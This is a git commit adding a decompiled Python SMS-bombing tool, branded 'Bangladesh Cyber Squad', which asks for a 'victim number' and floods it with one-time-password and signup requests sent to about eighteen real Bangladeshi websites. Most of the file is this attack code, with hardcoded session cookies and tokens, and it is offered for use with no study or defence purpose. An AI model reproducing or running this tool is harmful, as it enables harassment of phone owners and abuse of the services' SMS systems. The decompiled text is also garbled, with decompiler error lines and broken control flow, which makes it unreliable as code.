b78e84a0658cd763e194ac59a8360a9b21c4f405
Tajul25802 <138751821+Tajul25802@users.noreply.github.com>
2025-07-31 04:10:28 +0600

    Create Sms.py

---
+++ Sms.py
@@ -0,0 +1,291 @@
+# Source Generated with ShoaibxAmer Pycdc
+# File: bomb.pyc (Python 3.12)
+# Decoded By: DARK LMNx9 (t.me/x_LMNx9)
+
+Unsupported opcode: JUMP_BACKWARD
+Unsupported opcode: END_FOR
+Warning: block stack is not empty!
+import os
+import sys
+import time
+import requests
+import random
+import string
+logo = '\n╭───────────────────────────────────────────────────────────────╮\n│                \x1b[1m\x1b[33m ╔╗ ╔═╗╔═╗  ╔╗ ╔═╗╔╦╗╔╗ ╔═╗╦═╗\x1b[0m                 │\n│                \x1b[1m\x1b[33m ╠╩╗║  ╚═╗  ╠╩╗║ ║║║║╠╩╗║╣ ╠╦╝\x1b[0m                 │\n│                \x1b[1m\x1b[33m ╚═╝╚═╝╚═╝  ╚═╝╚═╝╩ ╩╚═╝╚═╝╩╚═\x1b[0m                 │\n╰─────────────────────【\x1b[1m\x1b[31mE\x1b[0m】【\x1b[1m\x1b[31mX\x1b[0m】【\x1b[1m\x1b[31mE\x1b[0m】【\x1b[1m\x1b[31mJOY\x1b[0m】────────────────────╯\n                   \n                   \x1b[36m\x1b[4m\x1b[1m\x1b[1m\x1b[1m\x1b[1mBANGLADESH CYBER SQUAD-BCS\x1b[0m\n                     \x1b[33m\x1b[1m\x1b[1mCEO\x1b[0m :\x1b[1m\x1b[1m\x1b[33mSHAWON ISLAM SAIM\x1b[0m\n'
+
+def clr():
+    os.system('clear')
+
+
+def log():
+Unsupported opcode: JUMP_BACKWARD
+Unsupported opcode: END_FOR
+Warning: block stack is not empty!
+    for x in logo:
+        sys.stdout.write(x)
+        sys.stdout.flush()
+        time.sleep(0.001)
+        return None
+
+menu = '\n             ╭──────────────────────────────────────╮\n             │   【01/A】\x1b[1m\x1b[36mSTART SMS BOMBING\x1b[0m          │\n             │   【02/B】\x1b[1m\x1b[36mREPORT FOR ANY BUGS \x1b[0m       │\n             │   【00/X】\x1b[1m\x1b[31mEXIT PROGRAMME \x1b[0m            │\n             ╰──────────────────────────────────────╯\n'
+a = '\x1b[1;30m'
+r = '\x1b[1;31m'
+g = '\x1b[1;32m'
+y = '\x1b[1;33m'
+b = '\x1b[1;34m'
+p = '\x1b[1;35m'
+c = '\x1b[1;36m'
+w = '\x1b[1;37m'
+bir = '\x1b[1;31m'
+bi = '\x1b[0;34m'
+bic = '\x1b[0;36m'
+r = '\x1b[1;31m'
+g = '\x1b[1;32m'
+n = '\n'
+y = '\x1b[1;33m'
+b = '\x1b[1;34m'
+p = '\x1b[1;35m'
+c = '\x1b[1;36m'
+w = '\x1b[1;37m'
+t = '\t'
+c1 = '\x1b[1;31m'
+c2 = '\x1b[1;32m'
+c3 = '\x1b[1;33m'
+c4 = '\x1b[1;34m'
+c5 = '\x1b[1;36m'
+c6 = '\x1b[1;37m'
+list = [
+    c1,
+    c2,
+    c3,
+    c4,
+    c5,
+    c6]
+list2 = [
+    r,
+    g,
+    c,
+    b,
+    y]
+ran = str(random.choice(list))
+ran2 = str(random.choice(list2))
+tim = time.strftime('      %I:%M ')
+tim2 = time.strftime('%I:%M')
+letters = string.ascii_lowercase
+pwd_length = 12
+pwd = ''
+for i in range(pwd_length):
+    pwd += ''.join(random.choice(letters))
+    tim = time.strftime('      %I:%M ')
+    tim2 = time.strftime('%I:%M')
+    ag2 = 'Mozilla/5.0 (Windows NT 10.0; rv:76.0) Gecko/20100101 Firefox/76.0'
+    agents = 'Mozilla/5.0 (Linux; Android 10; PPA-LX2; HMSCore 6.2.0.251) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.4324.93 HuaweiBrowser/11.1.5.111 Mobile Safari/537.36'
+    from requests.structures import CaseInsensitiveDict
+
+    def men():
+Unsupported opcode: JUMP_BACKWARD
+Unsupported opcode: END_FOR
+Warning: block stack is not empty!
+        for b in menu:
+            sys.stdout.write(b)
+            sys.stdout.flush()
+            time.sleep(0.001)
+            return None
+
+    line = '             ╰─>'
+
+    def len():
+Unsupported opcode: JUMP_BACKWARD
+Unsupported opcode: END_FOR
+Warning: block stack is not empty!
+        for k in line:
+            sys.stdout.write(k)
+            sys.stdout.flush()
+            time.sleep(0.01)
+            return None
+
+
+    def main():
+        clr()
+        log()
+        men()
+        len()
+        s = input('\x1b[33m\x1b[1m SELECT\x1b[0m : ')
+        if s in ('01', '1', 'A', 'a'):
+            bomber()
+            return None
+        if s in ('02', '2', 'B', 'b'):
+            os.system('xdg-open https://github.com/JOY-XII')
+            return None
+        if s in ('03', '3', 'X', 'x'):
+            time.sleep(2)
+            print(' \x1b[35mTHANKS FOR USING OUR TOOLS ')
+            sys.exit()
+            return None
+        print('23')
+
+
+    def bomber():
+Unsupported opcode: JUMP_BACKWARD
+Unsupported opcode: END_FOR
+Unsupported opcode: PUSH_EXC_INFO
+Unsupported opcode: CHECK_EXC_MATCH
+Unsupported opcode: JUMP_BACKWARD
+Unsupported opcode: RERAISE
+Unsupported opcode: RERAISE
+Unsupported opcode: COPY
+Unsupported opcode: RERAISE
+        request = requests.get('https://www.google.com/', timeout = 2)
+        print('')
+        print('\t        \x1b[32m\x1b[1mCHECKING YOUR INTERNET CONNECTION!\x1b[0m')
+        print('\t        \x1b[33m...........\x1b[31m\x1b[1m............\x1b[32m...........\x1b[0m')
+        time.sleep(2)
+        print('\t\t      \x1b[1;32m     CONNECTED ')
+        number = input(f'''\t{c} [ VICTIM NUMBER ] :{w} +880''')
+        amo = int(input(f'''\t{c} [ AMOUNT ]{w} : '''))
+        url1 = 'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0' + number
+        url2 = 'https://www.bioscopelive.com/en/login/send-otp?phone=880' + number + '&operator=bd-otp'
+        headers2 = CaseInsensitiveDict()
+        headers2['referer'] = 'https://www.bioscopelive.com/en/login?type=login'
+        url3 = 'https://fundesh.com.bd/api/auth/generateOTP?service_key='
+        headers3 = CaseInsensitiveDict()
+        headers3['Content-Type'] = 'application/json'
+        data3 = '{"msisdn":"' + number + '"}'
+        url4 = 'https://fundesh.com.bd/api/auth/resendOTP'
+        headers4 = CaseInsensitiveDict()
+        headers4['Content-Type'] = 'application/json'
+        data4 = '{"msisdn":"' + number + '"}'
+        url5 = 'https://api.redx.com.bd/v1/user/signup'
+        headers5 = CaseInsensitiveDict()
+        headers5['Accept'] = 'application/json, text/plain, */*'
+        headers5['Accept-Encoding'] = 'gzip, deflate, br'
+        headers5['Accept-Language'] = 'en-US,en;q=0.5'
+        headers5['Connection'] = 'keep-alive'
+        headers5['Content-Length'] = '65'
+        headers5['Content-Type'] = 'application/json'
+        headers5['Cookie'] = '_ga=GA1.3.1117093475.951445077; _gid=GA1.3.134905361.951445077; WZRK_S_4R6-9R6-155Z=%7B%22p%22%3A1%2C%22s%22%3A951410497%2C%22t%22%3A951445096%7D; WZRK_G=6184e322525e444ab0f771f7f041933a; _fbp=fb.2.951445106167.1213159921; _hjSessionUser_2064965=eyJpZCI6ImRhMmMzMDY1LWNkMDYtNWFlOC04NTA4LTg0MzYzYWM4Y2RiNyIsImNyZWF0ZWQiOjE2NTE0NDUxMDkwMjMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_2064965=eyJpZCI6IjMxMGI0MDQ2LTY3OGUtNDM2OS1hOWY1LTRlYzlmOWEyMDhkNCIsImNyZWF0ZWQiOjE2NTE0NDUxMTg1NzgsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1'
+        headers5['Host'] = 'api.redx.com.bd'
+        headers5['Origin'] = 'https://redx.com.bd'
+        headers5['Referer'] = 'https://redx.com.bd/registration/'
+        headers5['TE'] = 'Trailers'
+        headers5['User-Agent'] = 'Mozilla/5.0 (X11; Linux x66_64; rv:76.0) Gecko/20100101 Firefox/76.0'
+        headers5['x-access-token'] = 'Bearer null'
+        data5 = '{"name":"961096106","phoneNumber":"' + number + '","service":"redx"}'
+        url6 = 'https://api.bongo-solutions.com/auth/api/login/send-otp'
+        headers6 = CaseInsensitiveDict()
+        headers6['Content-Type'] = 'application/json'
+        data6 = '{"operator":"all","msisdn":"880' + number + '"}'
+        url7 = 'https://www.rokomari.com/resend-verification-code?email_phone=880' + number
+        url8 = 'https://www.pizzahutbd.com/customer/sign-in/mobile'
+        headers8 = CaseInsensitiveDict()
+        headers8['Cookie'] = 'XSRF-TOKEN=eyJpdiI6InNuQmtkMnFVT2xzT0I3eWhqbW5neHc9PSIsInZhbHVlIjoib3NEdnYrZUpuQWpoZ0dEcnJNT2VxVHd2M21acHFxWURzWXdYdlQrZVN2YTZlTGxWUktjUlllZEpxS0xpdG9odSIsIm1hYyI6IjM3N2ZmMjkyM2I4NmE2N2E5MjBmMzAzNThmMGQ0MTU0M2M0MmFlYTZiODkzYTc0MGY0M2JhZGNiNGMyMmNkNmYifQ%3D%3D; laravel_session=eyJpdiI6Ik13OW9FMzkraEprMlRVY0d1Z0dcL2hRPT0iLCJ2YWx1ZSI6InBzcVVOdnpVOEFoMllrdVJMeDhJdndvSGtOYWlJd3lzbzdFSVY4OXNOZWpDdFIrWVU0UzNwcWVEcHlcL1NscXZMIiwibWFjIjoiMWZiMDBkNDc3ZDJjNDYzYTU1NjAxOWRmZDBmZTFlNjVhNDlkOTljMjM5YmYxZmUxY2NhMDE5YjBmZjdkODU1MiJ9; _fbp=fb.1.95760618126.170097696; _ga_Y46ECXC3WS=GS1.1.957606120.1.1.957606120.0; _ga=GA1.2.157655917.957606120; _gid=GA1.2.1912717920.957606120; _gat_gtag_UA_80641075_1=1'
+        headers8['Content-Type'] = 'application/x-www-form-urlencoded'
+        data8 = '_token=t7I6C5hDF7XgnfD5rNkeEloIbGlS71lpa6tHZMPh&phone_number=0' + number
+        url9 = 'https://admission.ndub.edu.bd/api/users/register-step-1/'
+        headers9 = CaseInsensitiveDict()
+        headers9['Content-Type'] = 'application/json'
+        data9 = '{"name":"asad","email":"' + pwd + '@gmail.com","phone":"0' + number + '","password":"1q2w3e4r","confirmPassword":"1q2w3e4r"}'
+        url10 = 'https://developer.quizgiri.xyz/api/v2.0/send-otp'
+        headers10 = CaseInsensitiveDict()
+        headers10['Content-Type'] = 'application/json'
+        data10 = '{"phone":"0' + number + '","country_code":"+880","fcm_token":null}'
+        url11 = 'https://api.shikho.com/auth/v2/send/sms'
+        headers11 = CaseInsensitiveDict()
+        headers11['Content-Type'] = 'application/json'
+        data11 = '{"phone":"0' + number + '","email":null,"auth_type":"login"}'
+        url12 = 'https://prod-api.viewlift.com/identity/signup?site=hoichoitv'
+        data12 = {
+            'requestType': 'send',
+            'phoneNumber': '+880' + number,
+            'emailConsent': 'true',
+            'whatsappConsent': 'true' }
+        url15 = 'https://themallbd.com/api/auth/otp_login'
+        headers15 = CaseInsensitiveDict()
+        headers15['Content-Type'] = 'application/json'
+        data15 = '{"phone_number":"+880' + number + '"}'
+        url16 = 'https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web'
+        headers16 = CaseInsensitiveDict()
+        headers16['Host'] = 'api.ghoorilearning.com'
+        headers16['Origin'] = 'https://ghoorilearning.com'
+        headers16['Referer'] = 'https://ghoorilearning.com/'
+        headers16['Content-Type'] = 'application/json'
+        data16 = '{"name":"asad","mobile_no":"0' + number + '","password":"WzfTW4Cecz7NjAm","confirm_password":"WzfTW4Cecz7NjAm"}'
+        url17 = 'https://api.wholesalecart.com/v2/user/login-register'
+        headers17 = CaseInsensitiveDict()
+        headers17['Accept-Encoding'] = 'gzip, deflate, br'
+        headers17['Accept-Language'] = 'en-US,en;q=0.5'
+        headers17['Connection'] = 'keep-alive'
+        headers17['Content-Length'] = '75'
+        headers17['Content-Type'] = 'application/json'
+        headers17['Host'] = 'api.wholesalecart.com'
+        headers17['Origin'] = 'https://wholesalecart.com'
+        headers17['Referer'] = 'https://wholesalecart.com/login'
+        headers17['User-Agent'] = 'Mozilla/5.0 (X11; Linux x66_64; rv:76.0) Gecko/20100101 Firefox/76.0'
+        data17 = '{"phone":"0' + number + '","platform":"google","url":"https://www.google.com/"}'
+        url18 = 'https://moveon.com.bd/api/v1/customer/auth/phone/request-otp'
+        headers18 = CaseInsensitiveDict()
+        headers18['Content-Type'] = 'application/json'
+        data18 = '{"phone":"0' + number + '"}'
+        url19 = 'https://app.ipay.com.bd/api/v1/signup/v2'
+        headers19 = CaseInsensitiveDict()
+        headers19['Content-Type'] = 'application/json'
+        data19 = '{"accountType":1,"deviceId":"mobile-android-SM-N971N-a23e77d4428c3d91","mobileNumber":"+880' + number + '"}'
+        url20 = 'https://admission.ndub.edu.bd/api/users/reset/'
+        headers20 = CaseInsensitiveDict()
+        headers20['Content-Type'] = 'application/json'
+        data20 = '{"phone": "0' + number + '"}'
+        print(f'''\t{ran}          ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
+        print(f'''\t{r}            AMOUNT ({g}{amo}{r}){w}   {r}   TIME  {w}''')
+        print(f'''{ran}''')
+        for i in range(amo):
+            resp1 = requests.get(url1)
+            print(f'''\n\t {ran2} SMS SENT SUCCESSFULLY 💖 BY ᗷᑕ♦️ {w} {tim}''')
+            resp2 = requests.get(url2, headers = headers2)
+            print(f'''\n\t {ran2} SMS SENT SUCCESSFULLY 💖 BY ᗷᑕ♦️ {w} {tim}''')
+            resp3 = requests.post(url3, headers = headers3, data = data3)
+            print(f'''\n\t {ran2} SMS SENT SUCCESSFULLY 💖 BY ᗷᑕ♦️ {w} {tim}''')
+            resp4 = requests.post(url4, headers = headers4, data = data4)
+            print(f'''\n\t {ran2} SMS SENT SUCCESSFULLY 💖 BY ᗷᑕ♦️ {w} {tim}''')
+            resp5 = requests.post(url5, headers = headers5, data = data5)
+            print(f'''\n\t {ran2} SMS SENT SUCCESSFULLY 💖 BY ᗷᑕ♦️ {w} {tim}''')
+            resp6 = requests.post(url6, headers = headers6, data = data6)
+            print(f'''\n\t {ran2} SMS SENT SUCCESSFULLY 💖 BY ᗷᑕ♦️ {w} {tim}''')
+            resp7 = requests.get(url7)
+            print(f'''\n\t {ran2} SMS SENT SUCCESSFULLY 💖 BY ᗷᑕ♦️ {w} {tim}''')
+            resp10 = requests.get(url8, headers = headers8, data = data8)
+            print(f'''\n\t {ran2} SMS SENT SUCCESSFULLY 💖 BY ᗷᑕ♦️ {w} {tim}''')
+            resp11 = requests.get(url9, headers = headers9, data = data9)
+            print(f'''\n\t {ran2} SMS SENT SUCCESSFULLY 💖 BY ᗷᑕ♦️ {w} {tim}''')
+            resp12 = requests.post(url10, headers = headers10, data = data10)
+            print(f'''\n\t {ran2} SMS SENT SUCCESSFULLY 💖 BY ᗷᑕ♦️ {w} {tim}''')
+            resp13 = requests.get(url11, headers = headers11, data = data11)
+            print(f'''\n\t {ran2} SMS SENT SUCCESSFULLY 💖 BY ᗷᑕ♦️ {w} {tim}''')
+            resp14 = requests.post(url12, data = data12)
+            print(f'''\n\t {ran2} SMS SENT SUCCESSFULLY 💖 BY ᗷᑕ♦️ {w} {tim}''')
+            resp9 = requests.post(url15, headers = headers15, data = data15)
+            print(f'''\n\t {ran2} SMS SENT SUCCESSFULLY 💖 BY ᗷᑕ♦️ {w} {tim}''')
+            resp19 = requests.post(url16, headers = headers16, data = data16)
+            print(f'''\n\t {ran2} SMS SENT SUCCESSFULLY 💖 BY ᗷᑕ♦️ {w} {tim}''')
+            resp20 = requests.post(url17, data = data17)
+            print(f'''\n\t {ran2} SMS SENT SUCCESSFULLY 💖 BY ᗷᑕ♦️ {w} {tim}''')
+            resp21 = requests.post(url18, headers = headers18, data = data18)
+            print(f'''\n\t {ran2} SMS SENT SUCCESSFULLY 💖 BY ᗷᑕ♦️ {w} {tim}''')
+            resp21 = requests.post(url19, headers = headers19, data = data19)
+            print(f'''\n\t {ran2} SMS SENT SUCCESSFULLY 💖 BY ᗷᑕ♦️ {w} {tim}''')
+            resp21 = requests.post(url20, headers = headers20, data = data20)
+            print(f'''\n\t {ran2} SMS SENT SUCCESSFULLY 💖 BY ᗷᑕ♦️ {w} {tim}''')
+            print('')
+            input(b + '\t\t \x1b[1m   ᗷᗩᑎGᒪᗩᗪESᕼ ᑕYᗷEᖇ Sᑫᑌᗩᗪ')
+            sys.exit()
+            return None
+            if (requests.ConnectionError, requests.Timeout):
+                exception = None
+                print('\t\t    \x1b[1;31mYOUR INTERNET CONNECTION IS POOR !\x1b[0m')
+                exception = None
+                del exception
+                exception = None
+                del exception
+
+    main()
+    bomber()
+    return None
